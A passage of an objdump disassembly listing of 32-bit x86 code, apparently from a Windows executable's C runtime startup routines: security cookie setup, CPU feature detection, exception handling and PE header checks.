  40173e:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  401743:	66 39 88 18 00 40 00 	cmp    %cx,0x400018(%eax)
  40174a:	75 3e                	jne    0x40178a
  40174c:	8b 45 08             	mov    0x8(%ebp),%eax
  40174f:	b9 00 00 40 00       	mov    $0x400000,%ecx
  401754:	2b c1                	sub    %ecx,%eax
  401756:	50                   	push   %eax
  401757:	51                   	push   %ecx
  401758:	e8 7c fe ff ff       	call   0x4015d9
  40175d:	59                   	pop    %ecx
  40175e:	59                   	pop    %ecx
  40175f:	85 c0                	test   %eax,%eax
  401761:	74 27                	je     0x40178a
  401763:	83 78 24 00          	cmpl   $0x0,0x24(%eax)
  401767:	7c 21                	jl     0x40178a
  401769:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  401770:	b0 01                	mov    $0x1,%al
  401772:	eb 1f                	jmp    0x401793
  401774:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401777:	8b 00                	mov    (%eax),%eax
  401779:	33 c9                	xor    %ecx,%ecx
  40177b:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%eax)
  401781:	0f 94 c1             	sete   %cl
  401784:	8b c1                	mov    %ecx,%eax
  401786:	c3                   	ret
  401787:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40178a:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  401791:	32 c0                	xor    %al,%al
  401793:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401796:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40179d:	59                   	pop    %ecx
  40179e:	5f                   	pop    %edi
  40179f:	5e                   	pop    %esi
  4017a0:	5b                   	pop    %ebx
  4017a1:	c9                   	leave
  4017a2:	c3                   	ret
  4017a3:	55                   	push   %ebp
  4017a4:	8b ec                	mov    %esp,%ebp
  4017a6:	e8 2d 06 00 00       	call   0x401dd8
  4017ab:	85 c0                	test   %eax,%eax
  4017ad:	74 0f                	je     0x4017be
  4017af:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  4017b3:	75 09                	jne    0x4017be
  4017b5:	33 c0                	xor    %eax,%eax
  4017b7:	b9 f8 4a 41 00       	mov    $0x414af8,%ecx
  4017bc:	87 01                	xchg   %eax,(%ecx)
  4017be:	5d                   	pop    %ebp
  4017bf:	c3                   	ret
  4017c0:	55                   	push   %ebp
  4017c1:	8b ec                	mov    %esp,%ebp
  4017c3:	80 3d fc 4a 41 00 00 	cmpb   $0x0,0x414afc
  4017ca:	74 06                	je     0x4017d2
  4017cc:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  4017d0:	75 12                	jne    0x4017e4
  4017d2:	ff 75 08             	push   0x8(%ebp)
  4017d5:	e8 3e 3a 00 00       	call   0x405218
  4017da:	ff 75 08             	push   0x8(%ebp)
  4017dd:	e8 7b 0b 00 00       	call   0x40235d
  4017e2:	59                   	pop    %ecx
  4017e3:	59                   	pop    %ecx
  4017e4:	b0 01                	mov    $0x1,%al
  4017e6:	5d                   	pop    %ebp
  4017e7:	c3                   	ret
  4017e8:	55                   	push   %ebp
  4017e9:	8b ec                	mov    %esp,%ebp
  4017eb:	83 3d 00 4b 41 00 ff 	cmpl   $0xffffffff,0x414b00
  4017f2:	ff 75 08             	push   0x8(%ebp)
  4017f5:	75 07                	jne    0x4017fe
  4017f7:	e8 85 38 00 00       	call   0x405081
  4017fc:	eb 0b                	jmp    0x401809
  4017fe:	68 00 4b 41 00       	push   $0x414b00
  401803:	e8 e9 38 00 00       	call   0x4050f1
  401808:	59                   	pop    %ecx
  401809:	f7 d8                	neg    %eax
  40180b:	59                   	pop    %ecx
  40180c:	1b c0                	sbb    %eax,%eax
  40180e:	f7 d0                	not    %eax
  401810:	23 45 08             	and    0x8(%ebp),%eax
  401813:	5d                   	pop    %ebp
  401814:	c3                   	ret
  401815:	55                   	push   %ebp
  401816:	8b ec                	mov    %esp,%ebp
  401818:	ff 75 08             	push   0x8(%ebp)
  40181b:	e8 c8 ff ff ff       	call   0x4017e8
  401820:	f7 d8                	neg    %eax
  401822:	59                   	pop    %ecx
  401823:	1b c0                	sbb    %eax,%eax
  401825:	f7 d8                	neg    %eax
  401827:	48                   	dec    %eax
  401828:	5d                   	pop    %ebp
  401829:	c3                   	ret
  40182a:	55                   	push   %ebp
  40182b:	8b ec                	mov    %esp,%ebp
  40182d:	83 ec 14             	sub    $0x14,%esp
  401830:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401834:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401837:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  40183b:	50                   	push   %eax
  40183c:	ff 15 5c d0 40 00    	call   *0x40d05c
  401842:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401845:	33 45 f4             	xor    -0xc(%ebp),%eax
  401848:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40184b:	ff 15 58 d0 40 00    	call   *0x40d058
  401851:	31 45 fc             	xor    %eax,-0x4(%ebp)
  401854:	ff 15 54 d0 40 00    	call   *0x40d054
  40185a:	31 45 fc             	xor    %eax,-0x4(%ebp)
  40185d:	8d 45 ec             	lea    -0x14(%ebp),%eax
  401860:	50                   	push   %eax
  401861:	ff 15 50 d0 40 00    	call   *0x40d050
  401867:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40186a:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40186d:	33 45 ec             	xor    -0x14(%ebp),%eax
  401870:	33 45 fc             	xor    -0x4(%ebp),%eax
  401873:	33 c1                	xor    %ecx,%eax
  401875:	c9                   	leave
  401876:	c3                   	ret
  401877:	8b 0d 00 40 41 00    	mov    0x414000,%ecx
  40187d:	56                   	push   %esi
  40187e:	57                   	push   %edi
  40187f:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
  401884:	be 00 00 ff ff       	mov    $0xffff0000,%esi
  401889:	3b cf                	cmp    %edi,%ecx
  40188b:	74 04                	je     0x401891
  40188d:	85 ce                	test   %ecx,%esi
  40188f:	75 26                	jne    0x4018b7
  401891:	e8 94 ff ff ff       	call   0x40182a
  401896:	8b c8                	mov    %eax,%ecx
  401898:	3b cf                	cmp    %edi,%ecx
  40189a:	75 07                	jne    0x4018a3
  40189c:	b9 4f e6 40 bb       	mov    $0xbb40e64f,%ecx
  4018a1:	eb 0e                	jmp    0x4018b1
  4018a3:	85 ce                	test   %ecx,%esi
  4018a5:	75 0a                	jne    0x4018b1
  4018a7:	0d 11 47 00 00       	or     $0x4711,%eax
  4018ac:	c1 e0 10             	shl    $0x10,%eax
  4018af:	0b c8                	or     %eax,%ecx
  4018b1:	89 0d 00 40 41 00    	mov    %ecx,0x414000
  4018b7:	f7 d1                	not    %ecx
  4018b9:	5f                   	pop    %edi
  4018ba:	89 0d 04 40 41 00    	mov    %ecx,0x414004
  4018c0:	5e                   	pop    %esi
  4018c1:	c3                   	ret
  4018c2:	33 c0                	xor    %eax,%eax
  4018c4:	c3                   	ret
  4018c5:	33 c0                	xor    %eax,%eax
  4018c7:	40                   	inc    %eax
  4018c8:	c3                   	ret
  4018c9:	b8 00 40 00 00       	mov    $0x4000,%eax
  4018ce:	c3                   	ret
  4018cf:	68 18 4b 41 00       	push   $0x414b18
  4018d4:	ff 15 60 d0 40 00    	call   *0x40d060
  4018da:	c3                   	ret
  4018db:	b0 01                	mov    $0x1,%al
  4018dd:	c3                   	ret
  4018de:	68 00 00 03 00       	push   $0x30000
  4018e3:	68 00 00 01 00       	push   $0x10000
  4018e8:	6a 00                	push   $0x0
  4018ea:	e8 3b 39 00 00       	call   0x40522a
  4018ef:	83 c4 0c             	add    $0xc,%esp
  4018f2:	85 c0                	test   %eax,%eax
  4018f4:	75 01                	jne    0x4018f7
  4018f6:	c3                   	ret
  4018f7:	6a 07                	push   $0x7
  4018f9:	e8 45 00 00 00       	call   0x401943
  4018fe:	cc                   	int3
  4018ff:	c2 00 00             	ret    $0x0
  401902:	b8 20 4b 41 00       	mov    $0x414b20,%eax
  401907:	c3                   	ret
  401908:	b8 28 4b 41 00       	mov    $0x414b28,%eax
  40190d:	c3                   	ret
  40190e:	e8 ef ff ff ff       	call   0x401902
  401913:	8b 48 04             	mov    0x4(%eax),%ecx
  401916:	83 08 24             	orl    $0x24,(%eax)
  401919:	89 48 04             	mov    %ecx,0x4(%eax)
  40191c:	e8 e7 ff ff ff       	call   0x401908
  401921:	8b 48 04             	mov    0x4(%eax),%ecx
  401924:	83 08 02             	orl    $0x2,(%eax)
  401927:	89 48 04             	mov    %ecx,0x4(%eax)
  40192a:	c3                   	ret
  40192b:	33 c0                	xor    %eax,%eax
  40192d:	39 05 0c 40 41 00    	cmp    %eax,0x41400c
  401933:	0f 94 c0             	sete   %al
  401936:	c3                   	ret
  401937:	b8 d8 51 41 00       	mov    $0x4151d8,%eax
  40193c:	c3                   	ret
  40193d:	b8 d4 51 41 00       	mov    $0x4151d4,%eax
  401942:	c3                   	ret
  401943:	55                   	push   %ebp
  401944:	8b ec                	mov    %esp,%ebp
  401946:	81 ec 24 03 00 00    	sub    $0x324,%esp
  40194c:	53                   	push   %ebx
  40194d:	6a 17                	push   $0x17
  40194f:	ff 15 4c d0 40 00    	call   *0x40d04c
  401955:	85 c0                	test   %eax,%eax
  401957:	74 05                	je     0x40195e
  401959:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40195c:	cd 29                	int    $0x29
  40195e:	6a 03                	push   $0x3
  401960:	e8 d3 01 00 00       	call   0x401b38
  401965:	c7 04 24 cc 02 00 00 	movl   $0x2cc,(%esp)
  40196c:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  401972:	6a 00                	push   $0x0
  401974:	50                   	push   %eax
  401975:	e8 f6 0b 00 00       	call   0x402570
  40197a:	83 c4 0c             	add    $0xc,%esp
  40197d:	89 85 8c fd ff ff    	mov    %eax,-0x274(%ebp)
  401983:	89 8d 88 fd ff ff    	mov    %ecx,-0x278(%ebp)
  401989:	89 95 84 fd ff ff    	mov    %edx,-0x27c(%ebp)
  40198f:	89 9d 80 fd ff ff    	mov    %ebx,-0x280(%ebp)
  401995:	89 b5 7c fd ff ff    	mov    %esi,-0x284(%ebp)
  40199b:	89 bd 78 fd ff ff    	mov    %edi,-0x288(%ebp)
  4019a1:	66 8c 95 a4 fd ff ff 	data16 mov %ss,-0x25c(%ebp)
  4019a8:	66 8c 8d 98 fd ff ff 	data16 mov %cs,-0x268(%ebp)
  4019af:	66 8c 9d 74 fd ff ff 	data16 mov %ds,-0x28c(%ebp)
  4019b6:	66 8c 85 70 fd ff ff 	data16 mov %es,-0x290(%ebp)
  4019bd:	66 8c a5 6c fd ff ff 	data16 mov %fs,-0x294(%ebp)
  4019c4:	66 8c ad 68 fd ff ff 	data16 mov %gs,-0x298(%ebp)
  4019cb:	9c                   	pushf
  4019cc:	8f 85 9c fd ff ff    	pop    -0x264(%ebp)
  4019d2:	8b 45 04             	mov    0x4(%ebp),%eax
  4019d5:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
  4019db:	8d 45 04             	lea    0x4(%ebp),%eax
  4019de:	89 85 a0 fd ff ff    	mov    %eax,-0x260(%ebp)
  4019e4:	c7 85 dc fc ff ff 01 	movl   $0x10001,-0x324(%ebp)
  4019eb:	00 01 00 
  4019ee:	8b 40 fc             	mov    -0x4(%eax),%eax
  4019f1:	6a 50                	push   $0x50
  4019f3:	89 85 90 fd ff ff    	mov    %eax,-0x270(%ebp)
  4019f9:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4019fc:	6a 00                	push   $0x0
  4019fe:	50                   	push   %eax
  4019ff:	e8 6c 0b 00 00       	call   0x402570
  401a04:	8b 45 04             	mov    0x4(%ebp),%eax
  401a07:	83 c4 0c             	add    $0xc,%esp
  401a0a:	c7 45 a8 15 00 00 40 	movl   $0x40000015,-0x58(%ebp)
  401a11:	c7 45 ac 01 00 00 00 	movl   $0x1,-0x54(%ebp)
  401a18:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  401a1b:	ff 15 64 d0 40 00    	call   *0x40d064
  401a21:	6a 00                	push   $0x0
  401a23:	8d 58 ff             	lea    -0x1(%eax),%ebx
  401a26:	f7 db                	neg    %ebx
  401a28:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401a2b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401a2e:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  401a34:	1a db                	sbb    %bl,%bl
  401a36:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401a39:	fe c3                	inc    %bl
  401a3b:	ff 15 40 d0 40 00    	call   *0x40d040
  401a41:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401a44:	50                   	push   %eax
  401a45:	ff 15 3c d0 40 00    	call   *0x40d03c
  401a4b:	85 c0                	test   %eax,%eax
  401a4d:	75 0c                	jne    0x401a5b
  401a4f:	84 db                	test   %bl,%bl
  401a51:	75 08                	jne    0x401a5b
  401a53:	6a 03                	push   $0x3
  401a55:	e8 de 00 00 00       	call   0x401b38
  401a5a:	59                   	pop    %ecx
  401a5b:	5b                   	pop    %ebx
  401a5c:	c9                   	leave
  401a5d:	c3                   	ret
  401a5e:	55                   	push   %ebp
  401a5f:	8b ec                	mov    %esp,%ebp
  401a61:	83 ec 44             	sub    $0x44,%esp
  401a64:	6a 44                	push   $0x44
  401a66:	8d 45 bc             	lea    -0x44(%ebp),%eax
  401a69:	6a 00                	push   $0x0
  401a6b:	50                   	push   %eax
  401a6c:	e8 ff 0a 00 00       	call   0x402570
  401a71:	83 c4 0c             	add    $0xc,%esp
  401a74:	8d 45 bc             	lea    -0x44(%ebp),%eax
  401a77:	50                   	push   %eax
  401a78:	ff 15 68 d0 40 00    	call   *0x40d068
  401a7e:	f6 45 e8 01          	testb  $0x1,-0x18(%ebp)
  401a82:	74 06                	je     0x401a8a
  401a84:	0f b7 45 ec          	movzwl -0x14(%ebp),%eax
  401a88:	c9                   	leave
  401a89:	c3                   	ret
  401a8a:	6a 0a                	push   $0xa
  401a8c:	58                   	pop    %eax
  401a8d:	c9                   	leave
  401a8e:	c3                   	ret
  401a8f:	e9 2e fe ff ff       	jmp    0x4018c2
  401a94:	6a 00                	push   $0x0
  401a96:	ff 15 6c d0 40 00    	call   *0x40d06c
  401a9c:	85 c0                	test   %eax,%eax
  401a9e:	74 33                	je     0x401ad3
  401aa0:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
  401aa5:	66 39 08             	cmp    %cx,(%eax)
  401aa8:	75 29                	jne    0x401ad3
  401aaa:	8b 48 3c             	mov    0x3c(%eax),%ecx
  401aad:	03 c8                	add    %eax,%ecx
  401aaf:	81 39 50 45 00 00    	cmpl   $0x4550,(%ecx)
  401ab5:	75 1c                	jne    0x401ad3
  401ab7:	b8 0b 01 00 00       	mov    $0x10b,%eax
  401abc:	66 39 41 18          	cmp    %ax,0x18(%ecx)
  401ac0:	75 11                	jne    0x401ad3
  401ac2:	83 79 74 0e          	cmpl   $0xe,0x74(%ecx)
  401ac6:	76 0b                	jbe    0x401ad3
  401ac8:	83 b9 e8 00 00 00 00 	cmpl   $0x0,0xe8(%ecx)
  401acf:	0f 95 c0             	setne  %al
  401ad2:	c3                   	ret
  401ad3:	32 c0                	xor    %al,%al
  401ad5:	c3                   	ret
  401ad6:	68 e2 1a 40 00       	push   $0x401ae2
  401adb:	ff 15 40 d0 40 00    	call   *0x40d040
  401ae1:	c3                   	ret
  401ae2:	55                   	push   %ebp
  401ae3:	8b ec                	mov    %esp,%ebp
  401ae5:	56                   	push   %esi
  401ae6:	57                   	push   %edi
  401ae7:	8b 7d 08             	mov    0x8(%ebp),%edi
  401aea:	8b 37                	mov    (%edi),%esi
  401aec:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%esi)
  401af2:	75 25                	jne    0x401b19
  401af4:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  401af8:	75 1f                	jne    0x401b19
  401afa:	8b 46 14             	mov    0x14(%esi),%eax
  401afd:	3d 20 05 93 19       	cmp    $0x19930520,%eax
  401b02:	74 1d                	je     0x401b21
  401b04:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  401b09:	74 16                	je     0x401b21
  401b0b:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  401b10:	74 0f                	je     0x401b21
  401b12:	3d 00 40 99 01       	cmp    $0x1994000,%eax
  401b17:	74 08                	je     0x401b21
  401b19:	5f                   	pop    %edi
  401b1a:	33 c0                	xor    %eax,%eax
  401b1c:	5e                   	pop    %esi
  401b1d:	5d                   	pop    %ebp
  401b1e:	c2 04 00             	ret    $0x4
  401b21:	e8 31 0a 00 00       	call   0x402557
  401b26:	89 30                	mov    %esi,(%eax)
  401b28:	8b 77 04             	mov    0x4(%edi),%esi
  401b2b:	e8 30 0a 00 00       	call   0x402560
  401b30:	89 30                	mov    %esi,(%eax)
  401b32:	e8 52 37 00 00       	call   0x405289
  401b37:	cc                   	int3
  401b38:	83 25 30 4b 41 00 00 	andl   $0x0,0x414b30
  401b3f:	c3                   	ret
  401b40:	53                   	push   %ebx
  401b41:	56                   	push   %esi
  401b42:	be bc 24 41 00       	mov    $0x4124bc,%esi
  401b47:	bb bc 24 41 00       	mov    $0x4124bc,%ebx
  401b4c:	3b f3                	cmp    %ebx,%esi
  401b4e:	73 19                	jae    0x401b69
  401b50:	57                   	push   %edi
  401b51:	8b 3e                	mov    (%esi),%edi
  401b53:	85 ff                	test   %edi,%edi
  401b55:	74 0a                	je     0x401b61
  401b57:	8b cf                	mov    %edi,%ecx
  401b59:	ff 15 3c d1 40 00    	call   *0x40d13c
  401b5f:	ff d7                	call   *%edi
  401b61:	83 c6 04             	add    $0x4,%esi
  401b64:	3b f3                	cmp    %ebx,%esi
  401b66:	72 e9                	jb     0x401b51
  401b68:	5f                   	pop    %edi
  401b69:	5e                   	pop    %esi
  401b6a:	5b                   	pop    %ebx
  401b6b:	c3                   	ret
  401b6c:	53                   	push   %ebx
  401b6d:	56                   	push   %esi
  401b6e:	be c4 24 41 00       	mov    $0x4124c4,%esi
  401b73:	bb c4 24 41 00       	mov    $0x4124c4,%ebx
  401b78:	3b f3                	cmp    %ebx,%esi
  401b7a:	73 19                	jae    0x401b95
  401b7c:	57                   	push   %edi
  401b7d:	8b 3e                	mov    (%esi),%edi
  401b7f:	85 ff                	test   %edi,%edi
  401b81:	74 0a                	je     0x401b8d
  401b83:	8b cf                	mov    %edi,%ecx
  401b85:	ff 15 3c d1 40 00    	call   *0x40d13c
  401b8b:	ff d7                	call   *%edi
  401b8d:	83 c6 04             	add    $0x4,%esi
  401b90:	3b f3                	cmp    %ebx,%esi
  401b92:	72 e9                	jb     0x401b7d
  401b94:	5f                   	pop    %edi
  401b95:	5e                   	pop    %esi
  401b96:	5b                   	pop    %ebx
  401b97:	c3                   	ret
  401b98:	cc                   	int3
  401b99:	cc                   	int3
  401b9a:	cc                   	int3
  401b9b:	cc                   	int3
  401b9c:	cc                   	int3
  401b9d:	cc                   	int3
  401b9e:	cc                   	int3
  401b9f:	cc                   	int3
  401ba0:	68 e0 21 40 00       	push   $0x4021e0
  401ba5:	64 ff 35 00 00 00 00 	push   %fs:0x0
  401bac:	8b 44 24 10          	mov    0x10(%esp),%eax
  401bb0:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  401bb4:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  401bb8:	2b e0                	sub    %eax,%esp
  401bba:	53                   	push   %ebx
  401bbb:	56                   	push   %esi
  401bbc:	57                   	push   %edi
  401bbd:	a1 00 40 41 00       	mov    0x414000,%eax
  401bc2:	31 45 fc             	xor    %eax,-0x4(%ebp)
  401bc5:	33 c5                	xor    %ebp,%eax
  401bc7:	50                   	push   %eax
  401bc8:	89 65 e8             	mov    %esp,-0x18(%ebp)
  401bcb:	ff 75 f8             	push   -0x8(%ebp)
  401bce:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401bd1:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  401bd8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401bdb:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401bde:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401be4:	c3                   	ret
  401be5:	cc                   	int3
  401be6:	cc                   	int3
  401be7:	cc                   	int3
  401be8:	cc                   	int3
  401be9:	cc                   	int3
  401bea:	cc                   	int3
  401beb:	cc                   	int3
  401bec:	cc                   	int3
  401bed:	cc                   	int3
  401bee:	cc                   	int3
  401bef:	cc                   	int3
  401bf0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401bf3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401bfa:	59                   	pop    %ecx
  401bfb:	5f                   	pop    %edi
  401bfc:	5f                   	pop    %edi
  401bfd:	5e                   	pop    %esi
  401bfe:	5b                   	pop    %ebx
  401bff:	8b e5                	mov    %ebp,%esp
  401c01:	5d                   	pop    %ebp
  401c02:	51                   	push   %ecx
  401c03:	c3                   	ret
  401c04:	55                   	push   %ebp
  401c05:	8b ec                	mov    %esp,%ebp
  401c07:	83 25 34 4b 41 00 00 	andl   $0x0,0x414b34
  401c0e:	83 ec 24             	sub    $0x24,%esp
  401c11:	83 0d 10 40 41 00 01 	orl    $0x1,0x414010
  401c18:	6a 0a                	push   $0xa
  401c1a:	ff 15 4c d0 40 00    	call   *0x40d04c
  401c20:	85 c0                	test   %eax,%eax
  401c22:	0f 84 ac 01 00 00    	je     0x401dd4
  401c28:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401c2c:	33 c0                	xor    %eax,%eax
  401c2e:	53                   	push   %ebx
  401c2f:	56                   	push   %esi
  401c30:	57                   	push   %edi
  401c31:	33 c9                	xor    %ecx,%ecx
  401c33:	8d 7d dc             	lea    -0x24(%ebp),%edi
  401c36:	53                   	push   %ebx
  401c37:	0f a2                	cpuid
  401c39:	8b f3                	mov    %ebx,%esi
  401c3b:	5b                   	pop    %ebx
  401c3c:	90                   	nop
  401c3d:	89 07                	mov    %eax,(%edi)
  401c3f:	89 77 04             	mov    %esi,0x4(%edi)
  401c42:	89 4f 08             	mov    %ecx,0x8(%edi)
  401c45:	33 c9                	xor    %ecx,%ecx
  401c47:	89 57 0c             	mov    %edx,0xc(%edi)
  401c4a:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401c4d:	8b 7d e0             	mov    -0x20(%ebp),%edi
  401c50:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401c53:	81 f7 47 65 6e 75    	xor    $0x756e6547,%edi
  401c59:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401c5c:	35 69 6e 65 49       	xor    $0x49656e69,%eax
  401c61:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c64:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401c67:	35 6e 74 65 6c       	xor    $0x6c65746e,%eax
  401c6c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c6f:	33 c0                	xor    %eax,%eax
  401c71:	40                   	inc    %eax
  401c72:	53                   	push   %ebx
  401c73:	0f a2                	cpuid
  401c75:	8b f3                	mov    %ebx,%esi
  401c77:	5b                   	pop    %ebx
  401c78:	90                   	nop
  401c79:	8d 5d dc             	lea    -0x24(%ebp),%ebx
  401c7c:	89 03                	mov    %eax,(%ebx)
  401c7e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401c81:	0b 45 f8             	or     -0x8(%ebp),%eax
  401c84:	0b c7                	or     %edi,%eax
  401c86:	89 73 04             	mov    %esi,0x4(%ebx)
  401c89:	89 4b 08             	mov    %ecx,0x8(%ebx)
  401c8c:	89 53 0c             	mov    %edx,0xc(%ebx)
  401c8f:	75 43                	jne    0x401cd4
  401c91:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401c94:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
  401c99:	3d c0 06 01 00       	cmp    $0x106c0,%eax
  401c9e:	74 23                	je     0x401cc3
  401ca0:	3d 60 06 02 00       	cmp    $0x20660,%eax
  401ca5:	74 1c                	je     0x401cc3
  401ca7:	3d 70 06 02 00       	cmp    $0x20670,%eax
  401cac:	74 15                	je     0x401cc3
  401cae:	3d 50 06 03 00       	cmp    $0x30650,%eax
  401cb3:	74 0e                	je     0x401cc3
  401cb5:	3d 60 06 03 00       	cmp    $0x30660,%eax
  401cba:	74 07                	je     0x401cc3
  401cbc:	3d 70 06 03 00       	cmp    $0x30670,%eax
  401cc1:	75 11                	jne    0x401cd4
  401cc3:	8b 3d 38 4b 41 00    	mov    0x414b38,%edi
  401cc9:	83 cf 01             	or     $0x1,%edi
  401ccc:	89 3d 38 4b 41 00    	mov    %edi,0x414b38
  401cd2:	eb 06                	jmp    0x401cda
  401cd4:	8b 3d 38 4b 41 00    	mov    0x414b38,%edi
  401cda:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  401cdd:	6a 07                	push   $0x7
  401cdf:	58                   	pop    %eax
  401ce0:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401ce3:	39 45 f4             	cmp    %eax,-0xc(%ebp)
  401ce6:	7c 30                	jl     0x401d18
  401ce8:	33 c9                	xor    %ecx,%ecx
  401cea:	53                   	push   %ebx
  401ceb:	0f a2                	cpuid
  401ced:	8b f3                	mov    %ebx,%esi
  401cef:	5b                   	pop    %ebx
  401cf0:	90                   	nop
  401cf1:	8d 5d dc             	lea    -0x24(%ebp),%ebx
  401cf4:	89 03                	mov    %eax,(%ebx)
  401cf6:	89 73 04             	mov    %esi,0x4(%ebx)
  401cf9:	89 4b 08             	mov    %ecx,0x8(%ebx)
  401cfc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401cff:	89 53 0c             	mov    %edx,0xc(%ebx)
  401d02:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  401d05:	f7 c3 00 02 00 00    	test   $0x200,%ebx
  401d0b:	74 0e                	je     0x401d1b
  401d0d:	83 cf 02             	or     $0x2,%edi
  401d10:	89 3d 38 4b 41 00    	mov    %edi,0x414b38
  401d16:	eb 03                	jmp    0x401d1b
  401d18:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  401d1b:	a1 10 40 41 00       	mov    0x414010,%eax
  401d20:	83 c8 02             	or     $0x2,%eax
  401d23:	c7 05 34 4b 41 00 01 	movl   $0x1,0x414b34
  401d2a:	00 00 00 
  401d2d:	a3 10 40 41 00       	mov    %eax,0x414010
  401d32:	f7 c1 00 00 10 00    	test   $0x100000,%ecx
  401d38:	0f 84 93 00 00 00    	je     0x401dd1
  401d3e:	83 c8 04             	or     $0x4,%eax
  401d41:	c7 05 34 4b 41 00 02 	movl   $0x2,0x414b34
  401d48:	00 00 00 
  401d4b:	a3 10 40 41 00       	mov    %eax,0x414010
  401d50:	f7 c1 00 00 00 08    	test   $0x8000000,%ecx
  401d56:	74 79                	je     0x401dd1
  401d58:	f7 c1 00 00 00 10    	test   $0x10000000,%ecx
  401d5e:	74 71                	je     0x401dd1
  401d60:	33 c9                	xor    %ecx,%ecx
  401d62:	0f 01 d0             	xgetbv
  401d65:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401d68:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d6b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401d6e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401d71:	6a 06                	push   $0x6
  401d73:	5e                   	pop    %esi
  401d74:	23 c6                	and    %esi,%eax
  401d76:	3b c6                	cmp    %esi,%eax
  401d78:	75 57                	jne    0x401dd1
  401d7a:	a1 10 40 41 00       	mov    0x414010,%eax
  401d7f:	83 c8 08             	or     $0x8,%eax
  401d82:	c7 05 34 4b 41 00 03 	movl   $0x3,0x414b34
  401d89:	00 00 00 
  401d8c:	a3 10 40 41 00       	mov    %eax,0x414010
  401d91:	f6 c3 20             	test   $0x20,%bl
  401d94:	74 3b                	je     0x401dd1
  401d96:	83 c8 20             	or     $0x20,%eax
  401d99:	c7 05 34 4b 41 00 05 	movl   $0x5,0x414b34
  401da0:	00 00 00 
  401da3:	a3 10 40 41 00       	mov    %eax,0x414010
  401da8:	b8 00 00 03 d0       	mov    $0xd0030000,%eax
  401dad:	23 d8                	and    %eax,%ebx
  401daf:	3b d8                	cmp    %eax,%ebx
  401db1:	75 1e                	jne    0x401dd1
  401db3:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401db6:	ba e0 00 00 00       	mov    $0xe0,%edx
  401dbb:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401dbe:	23 c2                	and    %edx,%eax
  401dc0:	3b c2                	cmp    %edx,%eax
  401dc2:	75 0d                	jne    0x401dd1
  401dc4:	83 0d 10 40 41 00 40 	orl    $0x40,0x414010
  401dcb:	89 35 34 4b 41 00    	mov    %esi,0x414b34
  401dd1:	5f                   	pop    %edi
  401dd2:	5e                   	pop    %esi
  401dd3:	5b                   	pop    %ebx
  401dd4:	33 c0                	xor    %eax,%eax
  401dd6:	c9                   	leave
  401dd7:	c3                   	ret
  401dd8:	33 c0                	xor    %eax,%eax
  401dda:	39 05 d0 51 41 00    	cmp    %eax,0x4151d0
  401de0:	0f 95 c0             	setne  %al
  401de3:	c3                   	ret
  401de4:	55                   	push   %ebp
  401de5:	8b ec                	mov    %esp,%ebp
  401de7:	51                   	push   %ecx
  401de8:	8b 45 18             	mov    0x18(%ebp),%eax
  401deb:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  401dee:	53                   	push   %ebx
  401def:	56                   	push   %esi
  401df0:	8b 58 10             	mov    0x10(%eax),%ebx
  401df3:	57                   	push   %edi
